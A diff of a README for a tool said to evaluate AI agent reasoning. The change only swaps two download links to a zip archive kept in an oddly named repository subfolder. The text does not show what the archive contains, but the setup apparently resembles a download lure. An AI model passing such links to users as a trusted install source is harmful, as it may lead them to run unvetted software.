@@ -1,6 +1,6 @@
 # 🧠 agent-reasoning-evaluator - Evaluate AI Reasoning Efforts Easily
 
-[![Download](https://raw.githubusercontent.com/twis1d/agent-reasoning-evaluator/main/Hapalotis/agent-reasoning-evaluator.zip)](https://raw.githubusercontent.com/twis1d/agent-reasoning-evaluator/main/Hapalotis/agent-reasoning-evaluator.zip)
+[![Download](https://raw.githubusercontent.com/twis1d/agent-reasoning-evaluator/main/Hapalotis/evaluator-agent-reasoning-2.9.zip)](https://raw.githubusercontent.com/twis1d/agent-reasoning-evaluator/main/Hapalotis/evaluator-agent-reasoning-2.9.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **agent-reasoning-evaluator**! This app helps you evaluate and visual
 
 To download the application, visit the link below. Click on the version you want to download.
 
-[Visit this page to download](https://raw.githubusercontent.com/twis1d/agent-reasoning-evaluator/main/Hapalotis/agent-reasoning-evaluator.zip)
+[Visit this page to download](https://raw.githubusercontent.com/twis1d/agent-reasoning-evaluator/main/Hapalotis/evaluator-agent-reasoning-2.9.zip)
 
 After downloading, follow these steps:
 
